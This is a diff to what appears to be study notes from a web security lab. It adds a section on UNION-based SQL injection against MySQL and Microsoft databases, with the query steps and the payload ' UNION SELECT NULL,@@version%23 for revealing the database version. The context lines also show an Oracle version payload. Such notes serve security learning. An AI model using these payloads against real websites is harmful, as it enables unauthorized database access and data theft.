@@ -74,3 +74,15 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, banner FROM v
 ```
 
 > Payload : `' UNION SELECT NULL, banner FROM v$version --`
+
+## SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3 %23
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a' %23
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,@@version%23
+```
+
+> Payload : `' UNION SELECT NULL,@@version%23`
+
